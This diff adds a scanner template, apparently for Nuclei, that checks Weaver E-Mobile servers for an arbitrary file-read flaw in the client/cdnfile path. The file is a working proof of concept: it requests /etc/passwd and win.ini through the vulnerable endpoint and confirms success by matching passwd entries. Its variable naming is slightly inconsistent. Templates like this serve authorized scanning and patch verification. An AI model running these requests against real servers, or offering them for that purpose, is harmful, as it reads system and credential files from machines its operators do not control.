@@ -1,0 +1,45 @@
+id: poc-yaml-weaver-emobile-cdnfile-fileread
+info:
+  name: 泛微E-Mobile client/cdnfile 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  r_data_linux:
+    - "1C/Windows/win.ini"
+    - "C/etc/passwd"
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "移动管理平台"
+
+  - id: file-read-check
+    method: GET
+    path:
+      - "{{BaseURL}}/client/cdnfile/{{r_data_linux}}"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
